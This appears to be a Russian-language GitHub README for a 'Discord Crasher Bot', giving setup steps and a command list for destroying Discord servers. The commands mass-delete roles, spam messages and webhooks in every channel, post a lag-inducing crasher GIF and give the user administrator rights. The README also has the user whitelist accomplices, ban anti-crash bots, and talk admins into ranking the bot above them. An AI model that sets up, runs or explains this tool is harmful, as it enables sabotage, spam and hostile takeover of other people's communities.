# Discord Crasher Bot/DCB
![Лого](https://i.ibb.co/VjfhxXQ/photo-2021-02-13-22-31-00.jpg)
# Установка
```
sudo apt install python3 python3-pip
pip3 install discord
pip3 install colorama
pip3 install requests
git clone https://github.com/GlUTEN-BASH/discord_crasher/
cd discord_crasher
```
# Запуск 
Для начала отредактируйте файл config.ini, 
```
Token = Токен
```
Где написанно 'Токен' вставьте токен своего бота.

Далее сохраните изменения.

Во вкладке bot в discord developers нужно пролистать вниз и включить server members intent
![Воть](https://i.ibb.co/c8cZ68g/unknown.png)

Также можете указать себя и своих подельников в вайтлисте, чтобы их не забанило автобаном
Для этого отредактируйте config.ini и найдите строку:
```
Whitelist = []
```
В квадратные скобки вставьте свой айди и айди подельников через запятую, например:
```
Whitelist = [Айди1, айди2]
```

Если не хотите заполнять - просто удалите все в скобках и оставьте пустым

Кстати автобан - первое что сделает бот, дабы почистить сервер от антикрашеров

Для запуска пропишите:
```
python3 modded.py
```
Илм откройте, нажав пару раз на лкм

Готово! Бот должен быть онлайн, а в окне программы появиться:
![вот](https://i.ibb.co/CBjMWqf/photo-2021-02-13-22-41-43.jpg)

Боту на сервере нужно выдать администратора, или встроить администраторку заранее в OAuth2

Команды:

```
$help - фейк хелп


$hlp - автокраш сервера


$ml - спам сообщениями во всех каналах


$start - удаление всех ролей что сможет бот


$game (Место роли по иерархии ролей) - выдает роль с правами администратора тому кто ввел, нужно указать место роли, желательно выше обычной роли пользователей


$gamehelp - выводит в консоли список ролей по иерархической лестнице(только наоборот, тоесть @everyone сверху, а самая высокая снизу)


$gif - кидает по все каналы гифку - крашер, заранее выключите автоплей гифок если не хотите чтобы у вас залагал дискорд


$hooks - спам вебхуками
```


# FAQ:
# Не работает на windows:
Качаем python 3.9 - https://www.python.org/downloads/
В установщике ставим галочку add to path
Далее устанавливаем
и открываем cmd 
Пишем:
```
py -3 -m pip install -U discord.py
py -3 -m pip install colorama
py -3 -m pip install requests
```
Готово! Можно открывать (уже просто зайдя в папку со скачанной программой, и двумя щелчками мышки).

# Не крашит, только меняет имя:

Вы не дали боту права администратора на сервере, это нужно было сделать заранее, во вкладе OAuth2 в создании приглашения.

![Вот так](https://i.ibb.co/nnsgk4w/chrome-kdp4-Swtw22.png)

# Сразу закрывается:

Вы не ввели токен в программу.

Для этого нужно отредактировать config.ini и найти
```
Token = Токен
```
вместо слов "Токен" вводите ваш токен


# На сервере антикрашер банит бота:

Убедите админа поставить роль бота выше антикрашера, не буду говорить как, но все же. После этого автобан забанит всех, в том числе и автокрашера, поэтому потом бояться не нужно :)

# Дисклеймер и контакты
Внимание: Автор не берет на себя ответственность за совершенные вами действия, поэтому не надо писать что-то по типу "ой, я нажил себе проблем"

Телеграмм автора для связи: @GLUTESHUNECHKA

Дискорд сервера не будет

Дискорд (Новый) - Глютеша#1158

Всем цмок ;)
